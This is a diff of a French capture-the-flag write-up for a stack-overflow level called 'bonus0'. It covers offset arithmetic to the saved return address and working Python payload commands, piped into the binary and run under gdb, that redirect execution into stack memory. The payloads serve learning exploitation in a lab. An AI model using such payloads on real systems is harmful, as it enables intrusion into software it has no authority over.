@@ -29,11 +29,15 @@ On remarque ensuite que le eip de retour du main est stocké 54 caracteres apres
 
 On va donc commencer à ecrire 54 caracteres apres b1 :
 
-54 = 20 + 17 + 17
-b1 = b2 + b3 + b3
+54 = 20 + 1 + 19 + 14
 
+=
 On trouve donc le payload suivant :
 
 
 gdb /home/user/bonus0/bonus0 -ex "set args < <(python -c \"print 'a' * 20 + '\x0a' + 'b' * 4075 + '\x47' * 15 + '\xf0''\xff''\xbf' + 'g' + '\x0a'\")"
-																																	b1									filler			15 caracetres 				4 caracteres
+
+cat <(python -c "print 'a' * 20 + '\x0a' + 'b' * 4075 + 'b' * 14 + '\x47''\xf0''\xff''\xbf' + 'g' + '\x0a'") - | ./bonus0
+
+Note :
+Vu qu'on ne tape pas les caracteres a la main mais par bloc a travers le pipe, read ne va pas s'arreter au '\n', il faut donc completer les buffers pour pouvoir lire ce qu'on veut quand on le veut
